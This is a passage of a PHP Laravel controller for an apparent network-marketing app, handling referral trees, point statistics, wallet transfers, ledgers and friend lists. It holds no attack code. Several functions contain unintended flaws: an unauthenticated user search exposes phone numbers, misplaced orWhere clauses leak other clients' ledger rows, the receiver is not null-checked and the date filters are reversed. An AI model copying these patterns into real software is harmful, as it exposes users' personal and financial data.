        $ParentNetwork->PlanNetworkAgencies = $PlanNetworkAgencies;
        $ChildrenNetwork = PlanNetwork::leftjoin("clients as c1", "c1.IDClient", "plannetwork.IDClient")->leftjoin("clients as c2", "c2.IDClient", "plannetwork.IDReferralClient")->where("plannetwork.IDParentClient", $IDParentClient)->where("plannetwork.PlanNetworkAgency", $AgencyNumber)->select("plannetwork.PlanNetworkPosition", "c1.IDClient", "c1.IDPosition",  "c1.ClientName", "c1.ClientPhone", "c1.ClientAppID", "c1.ClientPrivacy", "c1.ClientPicture", "c1.ClientLeftPoints", "c1.ClientRightPoints", "c2.ClientName as ReferralName")->get();
        foreach ($ChildrenNetwork as $Child) {
            $SubChildrenNetwork = PlanNetwork::leftjoin("clients as c1", "c1.IDClient", "plannetwork.IDClient")->leftjoin("clients as c2", "c2.IDClient", "plannetwork.IDReferralClient")->where("plannetwork.IDParentClient", $Child->IDClient)->where("plannetwork.PlanNetworkAgency", 1)->select("plannetwork.PlanNetworkPosition", "c1.IDClient", "c1.IDPosition",  "c1.ClientName", "c1.ClientPhone", "c1.ClientAppID", "c1.ClientPrivacy", "c1.ClientPicture", "c1.ClientLeftPoints", "c1.ClientRightPoints", "c2.ClientName as ReferralName")->get();
            $SubChildrenNetwork = PlanNetworkResource::collection($SubChildrenNetwork);
            $Child->ChildrenNetwork = $SubChildrenNetwork;
        }

        $ChildrenNetwork = PlanNetworkResource::collection($ChildrenNetwork);


        $ParentNetwork->ChildrenNetwork = $ChildrenNetwork;
        $ParentNetwork = PlanNetworkResource::collection([$ParentNetwork])[0];

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $ParentNetwork
        );
        return $Response;
    }

    public function ClientNetworkStats(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $ClientLanguage = LocalAppLanguage($Client->ClientAppLanguage);
        $IDClient = $Client->IDClient;
        $AgencyNumber = $request->AgencyNumber;
        if (!$AgencyNumber) {
            $AgencyNumber = 1;
        }

        $PlanProductPoints = 0;
        $LeftPoints = 0;
        $RightPoints = 0;
        $LeftPersons = 0;
        $RightPersons = 0;

        $PlanProduct = PlanNetwork::leftjoin("planproducts", "planproducts.IDPlanProduct", "plannetwork.IDPlanProduct")->where("plannetwork.IDClient", $IDClient)->first();
        if ($PlanProduct) {
            $PlanProductPoints = $PlanProduct->PlanProductPoints;
        }

        $LeftNetwork = PlanNetwork::where("IDParentClient", $IDClient)->where("PlanNetworkAgency", $AgencyNumber)->where("PlanNetworkPosition", "LEFT")->first();
        $RightNetwork = PlanNetwork::where("IDParentClient", $IDClient)->where("PlanNetworkAgency", $AgencyNumber)->where("PlanNetworkPosition", "RIGHT")->first();

        if ($LeftNetwork) {
            $IDClient = $LeftNetwork->IDClient;
            $Key = $IDClient . "-";
            $SecondKey = $IDClient . "-";
            $ThirdKey = "-" . $IDClient;
            $AllNetwork = PlanNetwork::leftjoin("clients", "clients.IDClient", "plannetwork.IDClient")->leftjoin("clients as C1", "C1.IDClient", "plannetwork.IDReferralClient")->where("plannetwork.PlanNetworkAgency", $AgencyNumber);
            $AllNetwork = $AllNetwork->where(function ($query) use ($IDClient, $Key, $SecondKey, $ThirdKey) {
                $query->where("plannetwork.PlanNetworkPath", 'like', $IDClient . '%')
                    ->orwhere("plannetwork.PlanNetworkPath", $IDClient)
                    ->orwhere("plannetwork.PlanNetworkPath", 'like', $Key . '%')
                    ->orwhere("plannetwork.PlanNetworkPath", 'like', '%' . $SecondKey . '%')
                    ->orwhere("plannetwork.PlanNetworkPath", 'like', '%' . $ThirdKey . '%');
            });

            $LeftPersons = $AllNetwork->count() + 1;
            $LeftPoints = $LeftPersons * $PlanProductPoints;
            $LeftNetwork = $AllNetwork->select("plannetwork.IDClient")->get()->pluck("IDClient")->toArray();
            array_push($LeftNetwork, $IDClient);
        }

        if ($RightNetwork) {
            $IDClient = $RightNetwork->IDClient;
            $Key = $IDClient . "-";
            $SecondKey = $IDClient . "-";
            $ThirdKey = "-" . $IDClient;
            $AllNetwork = PlanNetwork::leftjoin("clients", "clients.IDClient", "plannetwork.IDClient")->leftjoin("clients as C1", "C1.IDClient", "plannetwork.IDReferralClient")->where("plannetwork.PlanNetworkAgency", $AgencyNumber);
            $AllNetwork = $AllNetwork->where(function ($query) use ($IDClient, $Key, $SecondKey, $ThirdKey) {
                $query->where("plannetwork.PlanNetworkPath", 'like', $IDClient . '%')
                    ->orwhere("plannetwork.PlanNetworkPath", $IDClient)
                    ->orwhere("plannetwork.PlanNetworkPath", 'like', $Key . '%')
                    ->orwhere("plannetwork.PlanNetworkPath", 'like', '%' . $SecondKey . '%')
                    ->orwhere("plannetwork.PlanNetworkPath", 'like', '%' . $ThirdKey . '%');
            });

            $RightPersons = $AllNetwork->count() + 1;
            $RightPoints = $RightPersons * $PlanProductPoints;
            $RightNetwork = $AllNetwork->select("plannetwork.IDClient")->get()->pluck("IDClient")->toArray();
            array_push($RightNetwork, $IDClient);
        }

        $TotalPoints = $LeftPoints + $RightPoints;
        $TotalPersons = $LeftPersons + $RightPersons;

        $Positions = Position::where("PositionStatus", "ACTIVE")->select("IDPosition", "PositionTitleEn", "PositionTitleAr")->get();
        $PositionTitle = "PositionTitle" . $ClientLanguage;
        foreach ($Positions as $Position) {
            $LeftPositionClient = 0;
            $RightPositionClient = 0;
            if ($LeftNetwork) {
                $LeftPositionClient = Client::where("IDPosition", $Position->IDPosition)->whereIn("IDClient", $LeftNetwork)->count();
            }
            if ($RightNetwork) {
                $RightPositionClient = Client::where("IDPosition", $Position->IDPosition)->whereIn("IDClient", $RightNetwork)->count();
            }
            $Position->PositionTitle = $Position->$PositionTitle;
            $Position->LeftPositionClient = $LeftPositionClient;
            $Position->RightPositionClient = $RightPositionClient;
            $Position->TotalPositionClient = $LeftPositionClient + $RightPositionClient;
            unset($Position['PositionTitleEn']);
            unset($Position['PositionTitleAr']);
        }

        $Response = array("TotalPoints" => $TotalPoints, "LeftPoints" => $LeftPoints, "RightPoints" => $RightPoints, "TotalPersons" => $TotalPersons, "LeftPersons" => $LeftPersons, "RightPersons" => $RightPersons, "Positions" => $Positions);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Response
        );
        return $Response;
    }

    public function ClientNetworkReferralTable(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $IDClient = $Client->IDClient;
        $AgencyNumber = $request->AgencyNumber;
        $IDPage = $request->IDPage;
        if (!$IDPage) {
            $IDPage = 0;
        } else {
            $IDPage = ($request->IDPage - 1) * 20;
        }
        if (!$AgencyNumber) {
            $AgencyNumber = 1;
        }

        $AllNetwork = PlanNetwork::leftjoin("clients", "clients.IDClient", "plannetwork.IDClient")->where("plannetwork.IDReferralClient", $IDClient)->where("plannetwork.PlanNetworkAgency", $AgencyNumber);

        $Pages = ceil($AllNetwork->count() / 20);
        $AllNetwork = $AllNetwork->select("clients.IDClient", "clients.ClientName", "clients.ClientPhone", "clients.ClientAppID", "clients.ClientPrivacy", "clients.ClientLeftPoints", "clients.ClientRightPoints", "plannetwork.created_at")->skip($IDPage)->take(20)->get();

        foreach ($AllNetwork as $Network) {
            $Network->ClientContact = $Network->ClientPhone;
            if ($Network->ClientPrivacy) {
                $Network->ClientContact = $Network->ClientAppID;
            }
            unset($Network["ClientPhone"]);
            unset($Network["ClientAppID"]);
            unset($Network["ClientPrivacy"]);
        }

        $Response = array("AllNetwork" => $AllNetwork, "Pages" => $Pages);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Response
        );
        return $Response;
    }

    public function ClientNetworkTable(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $IDClient = $Client->IDClient;
        $AgencyNumber = $request->AgencyNumber;
        $IDPage = $request->IDPage;
        if (!$IDPage) {
            $IDPage = 0;
        } else {
            $IDPage = ($request->IDPage - 1) * 20;
        }
        if (!$AgencyNumber) {
            $AgencyNumber = 1;
        }

        $Key = $IDClient . "-";
        $SecondKey = $IDClient . "-";
        $ThirdKey = "-" . $IDClient;
        $AllNetwork = PlanNetwork::leftjoin("clients", "clients.IDClient", "plannetwork.IDClient")->leftjoin("clients as C1", "C1.IDClient", "plannetwork.IDReferralClient")->where("plannetwork.PlanNetworkAgency", $AgencyNumber);
        $AllNetwork = $AllNetwork->where(function ($query) use ($IDClient, $Key, $SecondKey, $ThirdKey) {
            $query->where("plannetwork.PlanNetworkPath", 'like', $IDClient . '%')
                ->orwhere("plannetwork.PlanNetworkPath", $IDClient)
                ->orwhere("plannetwork.PlanNetworkPath", 'like', $Key . '%')
                ->orwhere("plannetwork.PlanNetworkPath", 'like', '%' . $SecondKey . '%')
                ->orwhere("plannetwork.PlanNetworkPath", 'like', '%' . $ThirdKey . '%');
        });

        $Pages = ceil($AllNetwork->count() / 20);
        $AllNetwork = $AllNetwork->select("clients.IDClient", "clients.ClientName", "clients.ClientPhone", "clients.ClientAppID", "clients.ClientPrivacy", "C1.ClientName as ReferralName", "plannetwork.created_at")->skip($IDPage)->take(20)->get();
        foreach ($AllNetwork as $Network) {
            $Network->ClientContact = $Network->ClientPhone;
            if ($Network->ClientPrivacy) {
                $Network->ClientContact = $Network->ClientAppID;
            }
            unset($Network["ClientPhone"]);
            unset($Network["ClientAppID"]);
            unset($Network["ClientPrivacy"]);
        }

        $Response = array("AllNetwork" => $AllNetwork, "Pages" => $Pages);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Response
        );
        return $Response;
    }

    public function ClientTransferCheck(Request $request)
    {
        $Type = $request->Type;
        $UserName = $request->UserName;
        $IDReferral = $request->IDReferral;
        if (!$Type) {
            $Clients = Client::where("ClientPhone", 'like', '%' . $UserName . '%')->orwhere("ClientAppID", 'like', '%' . $UserName . '%')->where("clients.ClientDeleted", 0)->select("IDClient", "ClientName", "ClientPicture", "ClientPhone", "ClientAppID", "ClientPrivacy")->get();
            foreach ($Clients as $Client) {
                if ($Client->ClientPrivacy) {
                    $Client->ClientPicture = '';
                } else {
                    $Client->ClientPicture = ($Client->ClientPicture) ? asset($Client->ClientPicture) : '';
                }
            }
        } else {
            if ($Type == "REFERRAL") {
                $Clients = PlanNetwork::leftjoin("clients", "clients.IDClient", "plannetwork.IDClient")->where("clients.ClientDeleted", 0);
                $Clients = $Clients->where(function ($query) use ($UserName) {
                    $query->where('clients.ClientName', 'like', '%' . $UserName . '%')
                        ->orwhere('clients.ClientAppID', 'like', '%' . $UserName . '%')
                        ->orwhere('clients.ClientEmail', 'like', '%' . $UserName . '%')
                        ->orwhere('clients.ClientPhone', 'like', '%' . $UserName . '%');
                })->select("clients.IDClient", "clients.ClientName", "clients.ClientPicture", "clients.ClientPhone", "clients.ClientAppID", "clients.ClientPrivacy")->get();
            }
            if ($Type == "UPLINE") {
                if (!$IDReferral) {
                    return RespondWithBadRequest(1);
                }
                $Key = $IDReferral . "-";
                $SecondKey = $IDReferral . "-";
                $ThirdKey = "-" . $IDReferral;
                $AllNetwork = PlanNetwork::where("PlanNetworkPath", 'like', $IDReferral . '%')->orwhere("PlanNetworkPath", 'like', $Key . '%')->orwhere("PlanNetworkPath", 'like', '%' . $SecondKey . '%')->orwhere("PlanNetworkPath", 'like', '%' . $ThirdKey . '%')->get()->pluck("IDClient")->toArray();
                array_push($AllNetwork, $IDReferral);
                $Clients = PlanNetwork::leftjoin("clients", "clients.IDClient", "plannetwork.IDClient")->where("clients.ClientDeleted", 0)->whereIn("clients.IDClient", $AllNetwork);
                $Clients = $Clients->where(function ($query) use ($UserName) {
                    $query->where('clients.ClientName', 'like', '%' . $UserName . '%')
                        ->orwhere('clients.ClientAppID', 'like', '%' . $UserName . '%')
                        ->orwhere('clients.ClientEmail', 'like', '%' . $UserName . '%')
                        ->orwhere('clients.ClientPhone', 'like', '%' . $UserName . '%');
                })->select("clients.IDClient", "clients.ClientName", "clients.ClientPicture", "clients.ClientPhone", "clients.ClientAppID", "clients.ClientPrivacy")->get();
            }
        }


        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Clients
        );
        return $Response;
    }

    public function ClientBalanceTransfer(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }
        if ($Client->ClientStatus == "NOT_VERIFIED") {
            return RespondWithBadRequest(62);
        }
        if ($Client->ClientStatus == "INACTIVE") {
            return RespondWithBadRequest(64);
        }

        $IDReceiver = $request->IDReceiver;
        $Amount = $request->Amount;
        $ClientSecurityCode = $request->ClientSecurityCode;
        $Receiver = Client::find($IDReceiver);
        if ($Receiver->ClientStatus == "NOT_VERIFIED") {
            return RespondWithBadRequest(63);
        }
        if ($Receiver->ClientStatus == "INACTIVE") {
            return RespondWithBadRequest(65);
        }

        if (!$Client) {
            return RespondWithBadRequest(23);
        }
        if (!$Amount) {
            return RespondWithBadRequest(1);
        }
        if (!$ClientSecurityCode) {
            return RespondWithBadRequest(1);
        }
        if ($Amount < 0) {
            return RespondWithBadRequest(1);
        }
        if ($Client->ClientBalance - $Amount < 0) {
            return RespondWithBadRequest(26);
        }
        if (!Hash::check($ClientSecurityCode, $Client->ClientSecurityCode)) {
            return RespondWithBadRequest(38);
        }

        $MainClient = $Client->IDClient;

        $BalanceTransfer = new BalanceTransfer;
        $BalanceTransfer->IDSender = $Client->IDClient;
        $BalanceTransfer->IDReceiver = $Receiver->IDClient;
        $BalanceTransfer->TransferAmount = $Amount;
        $BalanceTransfer->TransferStatus = "ACCEPTED";
        $BalanceTransfer->save();

        $BatchNumber = "#TR" . $BalanceTransfer->IDBalanceTransfer;
        $TimeFormat = new DateTime('now');
        $Time = $TimeFormat->format('H');
        $Time = $Time . $TimeFormat->format('i');
        $BatchNumber = $BatchNumber . $Time;
        AdjustLedger($Client, -$Amount, 0, 0, 0, Null, "WALLET", "WALLET", "TRANSFER", $BatchNumber);

        $Client = Client::find($Receiver->IDClient);
        $BatchNumber = "#TR" . $BalanceTransfer->IDBalanceTransfer;
        $TimeFormat = new DateTime('now');
        $Time = $TimeFormat->format('H');
        $Time = $Time . $TimeFormat->format('i');
        $BatchNumber = $BatchNumber . $Time;
        AdjustLedger($Client, $BalanceTransfer->TransferAmount, 0, 0, 0, Null, "WALLET", "WALLET", "TRANSFER", $BatchNumber);

        $Client = Client::find($MainClient);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Client->ClientBalance
        );
        return $Response;
    }

    public function ClientTransferHistory(Request $request, BalanceTransfer $BalanceTransfer)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $IDPage = $request->IDPage;
        $IDClient = $Client->IDClient;
        $TransferStatus = $request->TransferStatus;
        $StartDate = $request->StartDate;
        $EndDate = $request->EndDate;
        if (!$IDPage) {
            $IDPage = 0;
        } else {
            $IDPage = ($request->IDPage - 1) * 20;
        }

        $BalanceTransfer = $BalanceTransfer->leftjoin("clients as c1", "c1.IDClient", "balancetransfer.IDSender")->leftjoin("clients as c2", "c2.IDClient", "balancetransfer.IDReceiver")->where(function ($query) use ($IDClient) {
            $query->where('balancetransfer.IDSender', $IDClient)
                ->orwhere('balancetransfer.IDReceiver', $IDClient);
        });

        if ($TransferStatus) {
            $BalanceTransfer = $BalanceTransfer->where("balancetransfer.TransferStatus", $TransferStatus);
        }
        if ($StartDate) {
            $BalanceTransfer = $BalanceTransfer->where("balancetransfer.created_at", "<=", $StartDate);
        }
        if ($EndDate) {
            $BalanceTransfer = $BalanceTransfer->where("balancetransfer.created_at", ">=", $EndDate);
        }
        $BalanceTransfer = $BalanceTransfer->select("balancetransfer.IDBalanceTransfer", "balancetransfer.IDSender", "balancetransfer.IDReceiver", "balancetransfer.TransferStatus", "balancetransfer.TransferAmount", "balancetransfer.created_at", "c1.ClientName as SenderName", "c1.ClientPicture as SenderPicture", "c1.ClientPrivacy as SenderPrivacy", "c2.ClientName as ReceiverName", "c2.ClientPicture as ReceiverPicture", "c2.ClientPrivacy as ReceiverPrivacy");

        $Pages = ceil($BalanceTransfer->count() / 20);
        $BalanceTransfer = $BalanceTransfer->orderby("balancetransfer.IDBalanceTransfer", "DESC")->skip($IDPage)->take(20)->get();
        $BalanceTransfer = BalanceTransferResource::collection($BalanceTransfer);
        $Response = array("BalanceTransfer" => $BalanceTransfer, "Pages" => $Pages);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Response
        );
        return $Response;
    }

    public function ClientLedger(Request $request, ClientLedger $ClientLedger)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $IDPage = $request->IDPage;
        $StartDate = $request->StartDate;
        $EndDate = $request->EndDate;
        if (!$IDPage) {
            $IDPage = 0;
        } else {
            $IDPage = ($request->IDPage - 1) * 20;
        }

        $ClientLedger = $ClientLedger->where("IDClient", $Client->IDClient)->where("ClientLedgerAmount", "<>", 0);
        if ($StartDate) {
            $ClientLedger = $ClientLedger->where("created_at", "<=", $StartDate);
        }
        if ($EndDate) {
            $ClientLedger = $ClientLedger->where("created_at", ">=", $EndDate);
        }

        $TotalAmount = $ClientLedger->sum("ClientLedgerAmount");
        $Pages = ceil($ClientLedger->count() / 20);
        $ClientLedger = $ClientLedger->orderby("IDClientLedger", "DESC")->skip($IDPage)->take(20)->get();
        $Response = array("ClientLedger" => $ClientLedger, "TotalAmount" => $TotalAmount, "Pages" => $Pages);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Response
        );
        return $Response;
    }

    public function ClientCheques(Request $request, ClientLedger $ClientLedger)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $IDPage = $request->IDPage;
        $StartDate = $request->StartDate;
        $EndDate = $request->EndDate;
        if (!$IDPage) {
            $IDPage = 0;
        } else {
            $IDPage = ($request->IDPage - 1) * 20;
        }

        $ClientLedger = $ClientLedger->where("IDClient", $Client->IDClient)->where("ClientLedgerSource", "CHEQUE")->where("ClientLedgerDestination", "WALLET");
        if ($StartDate) {
            $ClientLedger = $ClientLedger->where("created_at", "<=", $StartDate);
        }
        if ($EndDate) {
            $ClientLedger = $ClientLedger->where("created_at", ">=", $EndDate);
        }

        $TotalAmount = $ClientLedger->sum("ClientLedgerAmount");
        $Pages = ceil($ClientLedger->count() / 20);
        $ClientLedger = $ClientLedger->orderby("IDClientLedger", "DESC")->skip($IDPage)->take(20)->get();
        $Response = array("ClientLedger" => $ClientLedger, "TotalAmount" => $TotalAmount, "Pages" => $Pages);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Response
        );
        return $Response;
    }

    public function ClientRewardPoints(Request $request, ClientLedger $ClientLedger)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $IDPage = $request->IDPage;
        $Type = $request->Type;
        $StartDate = $request->StartDate;
        $EndDate = $request->EndDate;
        if (!$IDPage) {
            $IDPage = 0;
        } else {
            $IDPage = ($request->IDPage - 1) * 20;
        }

        $ClientLedger = $ClientLedger->where("IDClient", $Client->IDClient)->where("ClientLedgerPoints", ">", 0)->where("ClientLedgerType", "<>", "CANCELLATION");
        if ($StartDate) {
            $ClientLedger = $ClientLedger->where("created_at", "<=", $StartDate);
        }
        if ($EndDate) {
            $ClientLedger = $ClientLedger->where("created_at", ">=", $EndDate);
        }
        if ($Type) {
            $ClientLedger = $ClientLedger->where("ClientLedgerDestination", $Type)->orWhere("ClientLedgerSource", $Type);
        }


        $TotalAmount = $ClientLedger->sum("ClientLedgerPoints");
        $Pages = ceil($ClientLedger->count() / 20);
        $ClientLedger = $ClientLedger->orderby("IDClientLedger", "DESC")->skip($IDPage)->take(20)->get();
        $Response = array("ClientLedger" => $ClientLedger, "TotalAmount" => $TotalAmount, "Pages" => $Pages);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Response
        );
        return $Response;
    }

    public function ClientRewardPointDetail($IDClientLedger)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $ClientLedger = ClientLedger::where("IDClient", $Client->IDClient)->where("IDClientLedger", $IDClientLedger)->first();
        if (!$ClientLedger) {
            return RespondWithBadRequest(1);
        }
    }

    public function AddFriend(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $IDFriend = $request->IDFriend;
        $IDClient = $Client->IDClient;
        if (!$IDFriend) {
            return RespondWithBadRequest(1);
        }

        $ClientFriend = ClientFriend::where(function ($query) use ($IDClient, $IDFriend) {
            $query->where('IDClient', $IDClient)->where('IDFriend', $IDFriend)
                ->orwhere('IDClient', $IDFriend)->where('IDFriend', $IDClient);
        })->whereNotIn("ClientFriendStatus", ["REMOVED", "REJECTED"])->first();

        if ($ClientFriend) {
            if ($ClientFriend->ClientFriendStatus == "PENDING") {
                return RespondWithBadRequest(27);
            }
            if ($ClientFriend->ClientFriendStatus == "ACCEPTED") {
                return RespondWithBadRequest(28);
            }
        }

        $ClientFriend = new ClientFriend;
        $ClientFriend->IDClient = $IDClient;
        $ClientFriend->IDFriend = $IDFriend;
        $ClientFriend->save();

        return RespondWithSuccessRequest(8);
    }

    public function FriendStatus(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $IDClientFriend = $request->IDFriend;
        $ClientFriendStatus = $request->ClientFriendStatus;
        $IDClient = $Client->IDClient;
        if (!$IDClientFriend) {
            return RespondWithBadRequest(1);
        }
        if (!$ClientFriendStatus) {
            return RespondWithBadRequest(1);
        }

        $ClientFriend = ClientFriend::where("IDClientFriend", $IDClientFriend)->where(function ($query) use ($IDClient) {
            $query->where('IDClient', $IDClient)->orwhere('IDFriend', $IDClient);
        })->whereNotIn("ClientFriendStatus", ["REMOVED", "REJECTED"])->first();

        if (!$ClientFriend) {
            return RespondWithBadRequest(1);
        }
        if ($ClientFriend->IDClient == $IDClient && $ClientFriend->ClientFriendStatus == "PENDING") {
            return RespondWithBadRequest(1);
        }
        if ($ClientFriendStatus == "REMOVED" && $ClientFriend->ClientFriendStatus == "PENDING") {
            return RespondWithBadRequest(1);
        }

        $ClientFriend->ClientFriendStatus = $ClientFriendStatus;
        $ClientFriend->save();

        return RespondWithSuccessRequest(8);
    }

    public function FriendList(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $IDPage = $request->IDPage;
        $IDClient = $Client->IDClient;
        $IDFriend = $request->IDFriend;
        $ClientFriendStatus = $request->ClientFriendStatus;
        $SearchKey = $request->SearchKey;
        if (!$ClientFriendStatus) {
            return RespondWithBadRequest(1);
        }
        if (!$IDPage) {
            $IDPage = 0;
        } else {
            $IDPage = ($request->IDPage - 1) * 20;
        }

        if ($IDFriend) {
            $IDClient = $IDFriend;
        }

        $ClientFriends = ClientFriend::leftjoin("clients as c1", "c1.IDClient", "clientfriends.IDClient")->leftjoin("clients as c2", "c2.IDClient", "clientfriends.IDFriend");
        if ($ClientFriendStatus == "ACCEPTED" || $ClientFriendStatus == "PENDING") {
            $ClientFriends = $ClientFriends->where(function ($query) use ($IDClient) {
                $query->where('clientfriends.IDClient', $IDClient)->orwhere('clientfriends.IDFriend', $IDClient);
            })->where("clientfriends.ClientFriendStatus", $ClientFriendStatus);
        }
        if ($ClientFriendStatus == "SENT") {
            $ClientFriends = $ClientFriends->where("clientfriends.IDClient", $IDClient)->where("clientfriends.ClientFriendStatus", "PENDING");
        }
        if ($ClientFriendStatus == "RECEIVED") {
            $ClientFriends = $ClientFriends->where("clientfriends.IDFriend", $IDClient)->where("clientfriends.ClientFriendStatus", "PENDING");
        }

        if ($SearchKey) {
            $ClientFriends = $ClientFriends->where(function ($query) use ($SearchKey) {
                $query->where('c1.ClientName', 'like', '%' . $SearchKey . '%')
                    ->orwhere('c2.ClientName', 'like', '%' . $SearchKey . '%');
            });
        }

        $ClientFriends = $ClientFriends->select("clientfriends.IDClientFriend", "clientfriends.IDClient", "clientfriends.IDFriend", "clientfriends.ClientFriendStatus", "c1.ClientName as ClientName", "c1.ClientPicture as ClientPicture", "c1.ClientPrivacy as ClientPrivacy", "c2.ClientName as FriendName", "c2.ClientPicture as FriendPicture", "c2.ClientPrivacy as FriendPrivacy");

        $Pages = ceil($ClientFriends->count() / 20);
        $ClientFriends = $ClientFriends->skip($IDPage)->take(20)->get();

        foreach ($ClientFriends as $Row) {
            $ClientFriendStatus = "";
            if (!$IDFriend) {
                $ClientFriendStatus = "FRIEND";
            }
            if ($IDClient == $Row->IDFriend) {
                $IDFriend = $Row->IDClient;
                $ClientName = $Row->ClientName;
                $ClientPicture = $Row->ClientPicture;
                $ClientPrivacy = $Row->ClientPrivacy;
                $IDThirdPerson = $Row->IDClient;
            } else {
                $IDFriend = $Row->IDFriend;
                $ClientName = $Row->FriendName;
                $ClientPicture = $Row->FriendPicture;
                $ClientPrivacy = $Row->FriendPrivacy;
                $IDThirdPerson = $Row->IDFriend;
            }

            if ($ClientPrivacy) {
                $ClientPicture = Null;
            }

            if ($IDFriend) {
                $MyID = $Client->IDClient;
                $ClientFriend = ClientFriend::where(function ($query) use ($MyID, $IDThirdPerson) {
                    $query->where('IDClient', $MyID)->where('IDFriend', $IDThirdPerson)
                        ->orwhere('IDClient', $IDThirdPerson)->where('IDFriend', $MyID);
                })->whereNotIn("ClientFriendStatus", ["REMOVED", "REJECTED"])->first();

                if ($ClientFriend) {
                    if ($ClientFriend->ClientFriendStatus == "PENDING") {
                        $ClientFriendStatus = "PENDING";
                    }
                    if ($ClientFriend->ClientFriendStatus == "ACCEPTED") {
                        $ClientFriendStatus = "FRIEND";
                    }
                }
            }

            $Row->IDClient = $IDFriend;
            $Row->ClientName = $ClientName;
            $Row->ClientPicture = $ClientPicture ? asset($ClientPicture) : '';
            $Row->ClientFriendStatus = $ClientFriendStatus;

            unset($Row['IDFriend']);
            unset($Row['ClientFriendStatus']);
            unset($Row['ClientPrivacy']);
            unset($Row['FriendName']);
            unset($Row['FriendPrivacy']);
            unset($Row['FriendPicture']);

            $Row->ClientFriendStatus = $ClientFriendStatus;
        }

        $Response = array("ClientFriends" => $ClientFriends, "Pages" => $Pages);

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $ClientFriends
        );
        return $Response;
    }

    public function FriendProfile($IDFriend)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $IDClient = $Client->IDClient;
        $ClientFriend = ClientFriend::where(function ($query) use ($IDClient, $IDFriend) {
            $query->where('IDClient', $IDClient)->where('IDFriend', $IDFriend)
                ->orwhere('IDClient', $IDFriend)->where('IDFriend', $IDClient);
        })->whereNotIn("ClientFriendStatus", ["REMOVED", "REJECTED"])->first();

        $Friend = Client::leftjoin("areas", "areas.IDArea", "clients.IDArea")->leftjoin("cities", "cities.IDCity", "areas.IDCity")->where("clients.IDClient", $IDFriend)->first();
        $Friend->ClientImages = [];
        $Friend->ClientVideos = [];
        if ($ClientFriend && !$Friend->ClientPrivacy) {
            $ClientImages = ClientDocument::where("IDClient", $IDFriend)->where("ClientDocumentDeleted", 0)->where("ClientDocumentType", "IMAGE")->get();
            $ClientVideos = ClientDocument::where("IDClient", $IDFriend)->where("ClientDocumentDeleted", 0)->where("ClientDocumentType", "Video")->get();
            foreach ($ClientImages as $Image) {
                $Image->ClientDocumentPath = $Image->ClientDocumentPath ? asset($Image->ClientDocumentPath) : '';
            }
            $Friend->ClientImages = $ClientImages;
            $Friend->ClientVideos = $ClientVideos;
        }

        $ClientFriendStatus = "";
        if ($ClientFriend) {
            if ($ClientFriend->ClientFriendStatus == "PENDING") {
                $ClientFriendStatus = "PENDING";
            }
            if ($ClientFriend->ClientFriendStatus == "ACCEPTED") {
                $ClientFriendStatus = "FRIEND";
            }
        }

        $ClientLanguage = LocalAppLanguage($Client->ClientAppLanguage);
        $PositionLanguageName = "PositionTitle" . $ClientLanguage;
        $Position = Position::find($Client->IDPosition);
        $PositionName = "Networker";
        if ($Position) {
            $PositionName = $Position->$PositionLanguageName;
        }

        $Friend->ClientFriendStatus = $ClientFriendStatus;
